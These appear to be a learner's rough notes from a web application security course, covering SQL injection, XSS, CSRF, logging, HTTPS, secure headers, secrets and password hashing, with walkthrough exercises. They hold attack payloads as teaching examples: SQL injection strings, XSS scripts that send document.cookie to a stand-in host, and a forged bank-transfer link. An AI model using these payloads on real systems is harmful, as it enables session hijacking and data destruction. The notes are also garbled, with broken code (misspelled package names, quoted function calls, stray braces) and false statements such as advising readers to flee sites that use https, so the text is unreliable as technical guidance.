Bruno's Request
Hey it is Bruno here.
I had an meeting with an CEO and he had worries about Keiko Corp being hacked.
It is time to update the security.
-Data Breaches
-Viruses

Section Overview
We all know that Security is important.
Many are attacked by hackers.
Is like playing defense in soccer.
Defensemen in soccer.
You trying to create something that is stable and secure.
Senior developers knows this.
Dosen't cost much-
We have the responisbility to build secure apps.
What are the 80% problems for the security.

Star of Security

Topics in this section.
-Authentication
-Don't trust Anyone
-Data Management 
-Access Control
-Secure Headers
-Code Secrets
-XSS & CSRF
-HTTPS Everywhere
-Logging
-3rd Party Libraries 
-Injections

Injections
These are the most common attacks.
If you are preventing agains Injections you are covering a very big part.
Means to injecting code to another code.
We are recieving code from another one.
SQL-injections are the most famous one.
PSequel.
Two tables.
Create Table sqlinjection.
We have the email and the id coloumn.
INSERT INTO sqlinjection (email) VALUES ('lol');
INSERT INTO sqlinjection (email) VALUES ('', DROP TABLE sqlinjection; --);
You can drop entire companies databases.
Extremly dangerous.
' or 1=1--.
'; DROP TABLE users; -- 
Does the password match and return the user database.
Injections happens with user inputs.
Starting an server.
We are using userinput where we are sending to the backend with
an post-request.
What happens if add an script-tag with an alert('boom').
They are not running at the time.
Enter an image-tage for example.
<img src='/' oneerror='alert('boom');/>
What we has just done is to inject this to websites.
How are preventing against it.
var textnode = document.createTextNode(input);
p.appendChild(textnode);
Converting it to an pure text.
Three main things to fix it

-Sanitize input
Make sure the user only enters the proper type.
Using whitelist and blacklists.

-Parametrics Queries
Also called prepare statements.
Think it off an function.
function sqlSelect(name, email , id) {
	if(name === number)
}
Object relational matters.
Think it off like variables.

-Knex.js or other ORMS
We are able to give parameters.
Knex.js takes cares of the parametes.

Exercise:#1-Injections

Go ahead and try logging in with the following credentials:

Email	user@email.com 
Password	password

Okay, so guessing the password didn't work. Let's try adding a quote character after the password:

Email	user@email.com
Password	password'

Hmmm. The application crashed with an unexpected error. 
What could that mean?

The logs show a SQL syntax error. This indicates that the quote character messed something up in an unexpected way.

...done.
Initializing log display.
Logging out of session.
Rendering login page.
Checking supplied authentication details for user@email.com.
Finding user in database.
No such user, report this to the user (invalid credentials?).

This is what the application code looks like behind the scenes.

SELECT *
  FROM users
  WHERE email = 'user@email.com'
   AND pass  = 'password' LIMIT 1

Enter the password password' and watch the code window.

The quote is inserted directly into the SQL string, and terminates the query early. This is what caused the syntax error we saw in the logs.

SELECT *
  FROM users
 WHERE email = 'user@email.com'
   AND pass  = 'password'' LIMIT 1

This behavior indicates that the application might be vulnerable to SQL INJECTION.

Enter the following credentials and click "Log in":

Email	user@email.com
Password	' or 1=1--

And we are in! We successfully gained access to the application without having to guess the password, using SQL INJECTION.

LOGS

password = 'password'' limit 1.
Unable to login this user due to unexpected error.
Rendering login page.
Checking supplied authentication details for user@email.com.
Finding user in database.
Authentication details confirmed, establishing session for this user.

CODE

SELECT *
  FROM users
 WHERE email = 'user@email.com'
   AND pass  = '' or 1=1--' LIMIT 1

The -- characters you entered caused the database to ignore the rest of the SQL statement, allowing you to be authenticated without having to supply the real password.

Exercise:#2-Security Files
Front-End and Back-End files.

3rd Party Libraries
As our application grows we  depend on more third-party
libraries.
A ton of code of another people.
We don't won't rewrite same code.
Perhaps this may not be the most secure.
Check the library.
If i'am bad with one problem but it may collect information.
You can trust React/Redux.
Use packages that is well known.

Two tools to check the libraries.

-npm install -g nsp
 nsp check # audit package.json

-npm install -g snyk
 snyk test # audit node_modules directory

Sometimes you must use sudo command to install.
We can run a program called nsp check.
Bad people trying to find vulnerability.
That's why you have many updates into your phone.
nsp gives you information.

The other tool.
If we run
snyk test.
Login with the github account.
snyk test is going to run many tests.
Snyk is testing many dependencies.
Careful about packages.

Logging
Another important topic.
Logging can be right tricky.
All about to gather information from users.
How you use websites.
Insuffcient Logging cupled with allows attackers 
attack system.
Time to detect a person has going into your system can take 120 days.
So it is important to have good Logging.

So we have these two tools.
-npm install winston
-npm install morgan
It is a Https-request middleware.
const morgan = require('morgan');
We can use morgan as an middle-ware.
app.use('morgan('tiny')').
We can have others options besides tiny.
After npm start
We get this message OPTIONS / secret 200 4 - 3.760 ms.
You see that is Options that is.
We install a package called corse.
npm install cors.
const cors = require('corse').
const morgan = require('morgan').
app.use('cors()').
We get this after cors POST/secret 200 9 - 3.194 ms
app.use(morgan('combine')).
You get more information after that.
const winston = require('winston').
Winston is a logger for just everything.
With Winston you have power to do more things.
With Winston you have to give it more inputs like
winston.log('info',userInput).
We can do some cool stuff with Winston
winston.log('info','userInput' + userInput).
winston.log('error','userInput' + userInput).
We can go back with Winston and get some inputs user has done.
You wanna log-information to get how it is working.
You never want to log-in informations on the front-end because of events.

HTTPS Everywhere
Are called SSL/TLS Certificates.
https://letsencrypt.org/
Means when we send information from the client to the server someone can take the information.
If some website is using https run away from that website.
SSL/TLS creates an tunnel of https.
This encrypts the information between the client and the server.
You are gonna see https in any sort of forms.
But there are ways you can misconfigure any things.
One of the best sites is called Let's Encrypt.
It will prevent the most.
In the early days you had to buy many Let's Encrypt.
SSL/TSL being backed by some companies.
If you have any form on your website you have to use https.
Cloudfare is really great works as Content.
They help against DNS-attacks.
Imagine we get millions of machines the server is not handle the request.
Cloudfare DNS-attacks protections.

XSS + CSRF
Your going to start noticing that they are over-crossing.
What is Cross-Site Scripting.
Includes untruseted data whenever an application includes untrusted data in a new web page without proper validation.
Cross-site scripting allows the hacker to execute code in the victims browser.
Practical example.
An blog-post with posts.
I can run codes on different sites.
'haxxed.com?cookie' + go to that website and document.cookie and send me that cookie.
A cookie is something a websites remeber.
And log-in to twitter.
Change the location
window.location = 'haxxed.com?cookie' + document.cookie
window.location shows the location of the url.
Sessions hajacking.

Client
Tunnel 1 
Server
Tunnel
DataBase
Tunnel 2
3rd Party API

We can use the cookies to access databases and servers.
<a href="http://netbank.com/transfer.do?acct=AttackerA&amount;=$100">Read more!</a>
This takes you to an bad website.
XSS we are using some get-request.
Aready used the coockies.
I have made the users to click on a link to create bad things.
Let's attack Twitter for example.
fetch('//httpbin.org/post' ,{method: 'POST', body:document.coockie})
It sends an request to a httpbin that is a http response and request server.
What ever response we get.
If we do this we get this error below.
Refused to connect to https://httpbin.org/post because it violates the following Content Security Policy.
We have to have it in the headers.
We can do it by:
app.get('/', (req,res) => {
	res.set({'Content-Security-Policy': "script-src 'self' 'https://apis.google.com'"})
});
  res.send('Hello World!')
});
If we go to Network-tag and localhost we get Content Security Policy on the website.
Simplify it we are automating this.

To be secure with coockies we can use.

app.get('/', (req,res) => {
	res.cookie('session', '1', {httpOnly: true})
	res.cookie('session', '1', {secure: true})
	res.set({'Content-Security-Policy': "script-src 'self' 'https://apis.google.com'"})
});
  res.send('Hello World!')
});

If we go to the application we have the cockies.

Summary
Always validate your code with userinput.
-Sanitize input
-No eval()
 Don't use this function.
-No document.write()
 document.write('<script>alert(1)</script>').
 Let's you not to do this because of Content-Security-Policy.
-Content Security Policy
 Set the headers.
-Secure + HTTPOnly Cookies
 
 npm install csurf

Exercise:#3- XSS + CSRF
1. XSS

Imagine you are the owner of breddit.com, the number one social media site for the baking industry. You have an avid community of commenters who love sharing their bread knowledge.

breddit.com/r/comments/how_much_do_you_like_bread/

How much do you guys like bread?

roll_with_it
I dream of baking tins.

Because the main use of your website is to facilitate discussion, users can add comments, which are saved to the database and displayed to other users.

How much do you guys like bread?
roll_with_it
I dream of baking tins.
I_knead_you_right_now
I love it so much, I think I might be part duck.

Unfortunately the popularity of your site has also attracted the attention of hackers, who want to access your site for nefarious purposes.

Unless you are careful when constructing the HTML, hackers can abuse the comment function by injecting JavaScript.

Watch how Mal injects some malicious JavaScript.

<script> alert('Your croissant are limp and sad.') </script>

Rude.

A real attack might use cross-site scripting to steal another user's cookie, which can permit session hijacking.

<script> window.location = 'haxxed.com?cookie' + document.cookie </script>

That's not good.

Now you try. Inject a script tag to call the upvote() function whenever the page is viewed.

<script> upvote()</script>

2. CSRF

When creating a website, we tend to code the client-side and the server-side together. We build the pages and forms a user will interact with on the client-side, then build the server-side URLs that respond when the user performs an action.

However, requests can be triggered to the server-side code from anywhere - not just the client-side code we write. This is one of the most powerful aspects of how internet is designed: it allows linking between sites. But it also the cause of a common security flaw, CROSS-SITE REQUEST FORGERY (CSRF).

A CSRF attack occurs when a user is tricked into interacting with a page or script on a third-party site that generates a malicious request to your site. All your server will see is an HTTP request from an authenticated user. However, an attacker takes control over the form of the data sent in the request to cause mischief.

Imagine you run the micro-blogging service that allows your users to tweep their opinions at each other in 140-character-sized chunks.

Mal is a hacker who has noticed that posts on your service are created using GET requests. This means that all the information is carried in the URL of the HTTP request.

Mal modifies the post-creation URL to include a malicious payload. Now he has to find some way to get a victim to visit the URL in their browser.

www.tweeper.com/post?message=This+horse+know+karate!+www%2Cbit.ly%2F60138Wawd

Vic is one of your users. Mal has been able to guess his email address.

Mal sends Vic an email with a very tempting link, pointing to the crafted URL.

Subject: Has science gone too far?
To: Vic
Researchers have taught this horse how to do karate!

That seems like a very dangerous thing to do.

Vic clicks on the link.

What if it starts teaching the other horses karate?

Your server interprets the request as Vic writing a post, and creates a new item on his timeline. This is not the action that Vic intended, but he may not quite have noticed what just occurred.

Wait - did I post that?

The post is designed to be enticing enough that other users of your site will click on it. When they do, they will be tricked in the same way Vic was.

You now have a worm on your site, as each user who clicks the link will open up a new set of potential victims. Bad news!

Code Secrets
With code secrets it is two things we wanna focus on.
-Enviromental Variables
-Commit History

Many times in our app we want to hide informationen.
Some times we wanna connect with an Database and hide information.

In our React we have access to
console.log(process.env.NODE_ENV).
And this is sayin in that process we are running give me the 
enviromental variable NODE_ENV.
We have our logger development.
Ohh we are running in developement let's set up the app 
for development purposes.
if(process.env.NODE_ENV === 'production'){
}

We now have the power to inject variables into the app from the outside world everything we can hide.
We are doing this by create  an file named .env
I can add anything i want.
REACT_APP_SAY_HI=HIII.
Securely add passwords and things.
You can use it for API-key for example.
Your are using an package named dotenv
npm install dotenv --save
Github has an commit history.
You never ever want to have secrets in git commit history.

Secure Headers
To what to with the contents.
Install package helmet. 
npm install helmet.
There exist packages that helps you with that.
See that your page is used by express in the network page.
Helmet helps to set the headers.
Include the package Helmet.
const helmet = require('helmet');
app.use(helmet());
Helmet sets everything and does all the configurations.
Helmet covers a bunch of things.

Access Control
Let's talk about access control.
Adds authentication to user.
What's does the user access to.
Prinicipal of least privilege.
What happens when we dosen't use Cors.
Error: No 'Access-Control-Allow-Origin'.
Cors stands for: Cross origin resource sharing.
I'don't have access for you to access the server.
Maybe the server is only meant for me to be myself to access the server.
Cors allows multiple users to gain access to the server.
To give the access to the clients to the server.
We are adding app.use(cors()).
We wanna give at least access to the user.
Good lists to give options as to check whitelist on websites.

Data Management
We are so close.
How can we improve security in data management.
We always want to have backups.
You want limit your information with encryption.
Encrypting all the data in transistion can be costly.
You want to be selective of which data you uses.

Hashing

bcrypt, scrypt, Aragon2

Decrypt your database
pgcrypto- encrypt a few columns

You want to do encryptions.
You want to have back-ups.

I actually love is password-storage.
Every website that has some input-forms.
These three has standed the time.

const brycpt = require('brypt-nodejs');
They have async and synchronous options.

bcrypt.hash("soup",null,null, function(err,hash) {
	
});

When they click submit you make it they puts in the body.
We never store datebases with the actual password.
We take the soup string and creates an hash of it.
How can we check for example Tim comes back to the website that this is him.
We use below

bcrypt.compare('soup',hash, function(err,res){
	console.log(res);	
});	

Don't trust Anyone
We can't expect that there good people evrywhere.
And everything is gonna workout with our code.
And we can't assume that everything is good.
Write good.
Allow my server to have access to some websites.
Add a ratelimiter to limit the request to the server.
How can you prevent bad actors.

Authentication
You maybe thinking logging and htps overlaps.
Authentication means that the other person on the other side 
says who they are.
Authentication is a very important thing.
We talk about token authentication and session authentication.
Implementing good passwords.
Perhaps signing into twitter.

Exercise:#4-Optional Hacking
Check it on the night!

Section Summary
I think the CEO is gonna like it with your security.
Maybe you need an promotion now.
One of my favorite topics.
Often overlooked.
